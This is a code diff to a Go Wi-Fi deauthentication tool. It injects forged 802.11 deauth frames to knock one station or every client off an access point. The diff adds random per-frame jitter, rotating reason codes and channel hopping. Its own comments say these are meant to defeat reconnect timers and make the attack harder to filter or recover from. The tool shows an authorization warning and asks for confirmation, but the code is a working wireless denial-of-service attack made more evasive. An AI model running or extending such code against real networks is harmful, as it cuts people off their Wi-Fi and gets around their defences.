@@ -29,9 +29,11 @@ import (
 	"context"
 	"flag"
 	"fmt"
+	"math/rand"
 	"os"
 	"os/exec"
 	"os/signal"
+	"strconv"
 	"strings"
 	"syscall"
 	"time"
@@ -43,7 +45,7 @@ import (
 	"gnulte-go/internal/ux"
 )
 
-const version = "12.0"
+const version = "13.0"
 
 func main() {
 	var (
@@ -55,6 +57,10 @@ func main() {
 		delay    = flag.Int("delay", 5, "seconds between bursts (repeat kicks a client that reconnects)")
 		once     = flag.Bool("once", false, "send a single burst and exit")
 		duration = flag.Int("duration", 0, "auto-stop after N seconds (0 = until interrupt)")
+		jitter   = flag.Int("jitter", 2, "random 0-N ms delay before each frame (irregular timing defeats reconnect timers)")
+		mix      = flag.Bool("mix-reasons", true, "rotate the deauth reason code each burst")
+		hop      = flag.Bool("hop", false, "hop the adapter between channels after each burst")
+		channels = flag.String("channels", "1,6,11", "comma-separated channel list used with --hop")
 
 		force       = flag.Bool("force", false, "skip interactive confirmations (require explicit flags)")
 		noBanner    = flag.Bool("no-banner", false, "skip the banner")
@@ -69,6 +75,9 @@ func main() {
 	flag.StringVar(staArg, "station", "", "station MAC to disconnect (ff:ff:ff:ff:ff:ff = every client on the BSSID)")
 	flag.BoolVar(noBanner, "minimal", false, "skip the banner (alias: --no-banner)")
 	flag.BoolVar(quiet, "quiet", false, "quiet: results only")
+	flag.IntVar(jitter, "jitter-ms", 2, "random 0-N ms delay before each frame")
+	flag.BoolVar(mix, "mix", true, "rotate the deauth reason code each burst")
+	flag.BoolVar(hop, "hop-channels", false, "hop the adapter between channels after each burst")
 	flag.Usage = usage
 	flag.Parse()
 
@@ -89,6 +98,16 @@ func main() {
 	explicit := map[string]bool{}
 	flag.Visit(func(f *flag.Flag) {
 		explicit[f.Name] = true
+		// Aliased spellings (--jitter / --jitter-ms, --mix / --mix-reasons,
+		// --hop / --hop-channels) share one value; treat either as explicit.
+		switch f.Name {
+		case "jitter":
+			explicit["jitter-ms"] = true
+		case "mix":
+			explicit["mix-reasons"] = true
+		case "hop":
+			explicit["hop-channels"] = true
+		}
 	})
 	prefs, err := settings.Load()
 	if err != nil {
@@ -113,6 +132,24 @@ func main() {
 	}
 	if !explicit["delay"] && prefs.WifiDelaySec >= 1 {
 		*delay = prefs.WifiDelaySec
+	}
+	if !explicit["jitter-ms"] && prefs.WifiJitterMs >= 0 {
+		*jitter = prefs.WifiJitterMs
+	}
+	if !explicit["mix"] {
+		*mix = prefs.WifiMixReasons
+	}
+	if !explicit["hop-channels"] {
+		*hop = prefs.WifiHop
+	}
+	if !explicit["channels"] && prefs.WifiChannels != "" {
+		*channels = prefs.WifiChannels
+	}
+	// An explicit --reason means "send exactly this reason"; mixing would fight
+	// it, so it takes precedence.
+	explicitReason := explicit["reason"]
+	if explicitReason {
+		*mix = false
 	}
 	if !*noBanner && !*quiet && os.Getenv("GNULTE_AS_ROOT") != "1" {
 		banner()
@@ -173,6 +210,20 @@ func main() {
 	if *delay < 1 {
 		*delay = 1
 	}
+	if *jitter < 0 {
+		*jitter = 0
+	}
+	if *jitter > 100 {
+		*jitter = 100
+	}
+	var hopChannels []uint8
+	if *hop {
+		var err error
+		hopChannels, err = airframes.ParseChannels(*channels)
+		if err != nil {
+			fatal(fmt.Errorf("--channels: %v", err))
+		}
+	}
 
 	// Interface sanity before any frame is sent: must exist and be in monitor
 	// mode, otherwise the injector (or the network) is wrong.
@@ -190,7 +241,7 @@ func main() {
 	}
 
 	if !*quiet {
-		summary(bssid, station, *ifaceArg, *count, *delay, *once, *duration, *reason)
+		summary(bssid, station, *ifaceArg, *count, *delay, *once, *duration, *reason, *jitter, *mix, *hop, hopChannels)
 	}
 	if !*force {
 		if !stdinIsTTY() {
@@ -220,12 +271,31 @@ func main() {
 
 	if !*quiet {
 		fmt.Println("  " + okText("Injecting deauth frames — "+stationLabel(station)))
-		fmt.Println("  " + ux.C(ux.Dim, "  Ctrl+C stops the test; the station reconnects on its own."))
+		extras := ""
+		if *jitter > 0 {
+			extras += fmt.Sprintf(", jitter ≤%dms", *jitter)
+		}
+		if *mix {
+			extras += ", rotating reason codes"
+		}
+		if *hop {
+			extras += ", channel hopping"
+		}
+		fmt.Println("  " + ux.C(ux.Dim, "  Ctrl+C stops the test; the station reconnects on its own."+extras))
 		fmt.Println()
 	}
 
-	var seq uint16
-	var sent, bursts uint64
+	reasons := []uint16{uint16(*reason)}
+	if *mix {
+		reasons = airframes.ReasonCodes()
+	}
+	var (
+		seq uint16
+		rng = rand.New(rand.NewSource(time.Now().UnixNano()))
+		sent,
+		bursts uint64
+		chIdx int
+	)
 loop:
 	for {
 		select {
@@ -233,21 +303,48 @@ loop:
 			break loop
 		default:
 		}
+		rc := reasons[bursts%uint64(len(reasons))]
 		for i := 0; i < *count; i++ {
-			f := airframes.DeauthFrame(bssid, station, uint16(*reason), seq)
+			select {
+			case <-sigCtx.Done():
+				break loop
+			default:
+			}
+			if *jitter > 0 {
+				time.Sleep(time.Duration(rng.Intn(*jitter+1)) * time.Millisecond)
+			}
+			f := airframes.DeauthFrame(bssid, station, rc, seq)
 			seq = (seq + 1) & 0x0fff
 			if err := inj.Send(f); err != nil {
 				fatal(fmt.Errorf("frame %d: %v", sent+1, err))
 			}
 			sent++
 		}
+		sentFlag := ""
+		if *mix && len(reasons) > 1 {
+			sentFlag = fmt.Sprintf(" (reason %d)", rc)
+		}
 		bursts++
 		if !*quiet {
-			fmt.Printf("  %s burst #%-3d  %5d frames → %-17s %s\n",
-				ux.C(ux.Cyan, ">>"), bursts, *count, station, ux.C(ux.Dim, stationLabelExtra(station)))
+			hopTxt := ""
+			if *hop {
+				hopTxt = fmt.Sprintf("  · ch %d", hopChannels[chIdx])
+			}
+			fmt.Printf("  %s burst #%-3d  %5d frames → %-17s %s%s\n",
+				ux.C(ux.Cyan, ">>"), bursts, *count, station, ux.C(ux.Dim, stationLabelExtra(station)+sentFlag), hopTxt)
 		}
 		if *once {
 			break loop
+		}
+		// Channel-hopping follows the burst: jump the adapter before the next
+		// round so a channel-hopping AP or a station that left the channel can
+		// still be reached.
+		if *hop {
+			next := hopChannels[chIdx%len(hopChannels)]
+			chIdx++
+			if err := airframes.SetChannel(*ifaceArg, next); err != nil {
+				fatal(fmt.Errorf("channel hop: %v", err))
+			}
 		}
 		select {
 		case <-sigCtx.Done():
@@ -255,6 +352,11 @@ loop:
 		case <-time.After(time.Duration(*delay) * time.Second):
 		}
 	}
+
+	// The burst loop is done; hand Ctrl+C back to the shell so a second press
+	// during the summary actually kills the process instead of being swallowed
+	// by the NotifyContext we installed for the loop.
+	signal.Reset(os.Interrupt, syscall.SIGTERM)
 
 	if !*quiet {
 		fmt.Println()
@@ -280,7 +382,7 @@ func stationLabelExtra(s airframes.MAC) string {
 }
 
 // summary prints the pre-test confirmation box (mirrors gnulte's CONFIRM TEST).
-func summary(bssid, station airframes.MAC, iface string, count, delay int, once bool, duration, reason int) {
+func summary(bssid, station airframes.MAC, iface string, count, delay int, once bool, duration, reason, jitter int, mix, hop bool, hopCh []uint8) {
 	repeat := fmt.Sprintf("every %d s until interrupted", delay)
 	if once {
 		repeat = "single burst"
@@ -294,8 +396,21 @@ func summary(bssid, station airframes.MAC, iface string, count, delay int, once 
 	fmt.Printf("  Station      : %s\n", ux.C(ux.Target, stationLabel(station)))
 	fmt.Printf("  Interface    : %s (monitor mode)\n", ux.C(ux.Cyan, iface))
 	fmt.Printf("  Deauth reason: %d\n", reason)
+	if mix {
+		fmt.Printf("  Reason mix   : rotate per burst (%d reasons)\n", len(airframes.ReasonCodes()))
+	}
 	fmt.Printf("  Frames/burst : %d\n", count)
+	if jitter > 0 {
+		fmt.Printf("  Jitter       : 0-%d ms per frame\n", jitter)
+	}
 	fmt.Printf("  Repeat       : %s\n", repeat)
+	if hop {
+		chs := make([]string, 0, len(hopCh))
+		for _, c := range hopCh {
+			chs = append(chs, strconv.Itoa(int(c)))
+		}
+		fmt.Printf("  Channel hop  : %s\n", strings.Join(chs, " → "))
+	}
 	fmt.Println("  Warning      : this disconnects the station from its router")
 	fmt.Println("                 and stops its Wi-Fi until it reconnects.")
 	fmt.Println("  Use only where you are authorized and the activity is lawful.")
@@ -392,6 +507,13 @@ Options:
       --reason CODE       deauth reason code (default 7 = STA leaving BSS)
       --count N           frames per burst (default 64)
       --delay SECONDS     seconds between bursts (default 5)
+      --jitter-ms N       random 0-N ms delay before each frame (defeats
+                          reconnect timers; 0 = no jitter)
+      --mix               rotate the reason code each burst (default on;
+                          off when --reason is given explicitly)
+      --hop-channels      hop the adapter through a channel list after each
+                          burst, so a channel-hopping AP stays in range
+      --channels LIST     hop list, comma-separated (default 1,6,11)
       --once              send a single burst and exit
       --duration SECONDS  auto-stop after N seconds (0 = until Ctrl+C)
       --force             skip interactive confirmations
@@ -405,6 +527,8 @@ Options:
 
 The interface must already be in monitor mode (airmon-ng start / iw dev set
 type monitor). Some adapters cap injection rates; raise --count if a single
-frame rarely lands.
+frame rarely lands. Mixing reason codes and adding jitter make the deauths
+progressively harder to filter or recover from — the station keeps dropping
+its association while it tries to rejoin, on networks you own.
 `, version)
 }
